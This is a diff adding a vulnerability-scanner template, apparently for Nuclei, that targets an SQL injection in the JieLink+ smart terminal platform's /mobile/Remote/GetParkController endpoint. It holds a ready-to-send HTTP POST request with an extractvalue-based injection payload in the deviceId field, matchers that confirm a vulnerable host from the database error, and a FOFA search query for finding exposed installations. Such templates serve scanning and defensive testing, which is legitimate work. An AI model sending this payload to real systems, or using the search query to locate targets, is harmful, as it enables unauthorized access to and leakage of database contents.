@@ -1,0 +1,42 @@
+id: jielink-GetParkController-sqli
+info:
+  name: JieLink+ 智能终端操作平台 GetParkController - sqli
+  author: leadlife
+  severity: high
+  description: jieLink+智能终端操作平台deviceId参数存在sql注入漏洞，攻击者利用此漏洞可导致数据库的敏感信息泄露。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/JieLink/JieLink%2B%E6%99%BA%E8%83%BD%E7%BB%88%E7%AB%AF%E6%93%8D%E4%BD%9C%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: title="JieLink+智能终端操作平台"
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: 2024,jielink,sqli
+
+http:
+  - raw:
+      - |
+        POST /mobile/Remote/GetParkController HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
+        Accept: application/json, text/plain, */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+        Connection: close
+        Cookie: DefaultSystem=Mobile; ASP.NET_SessionId=533gfzuselgriachdgogkug5
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 66
+        
+        deviceId=1'and/**/extractvalue(1,concat(char(126),database()))and'
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'XPATH','syntax','error')
+        condition: and
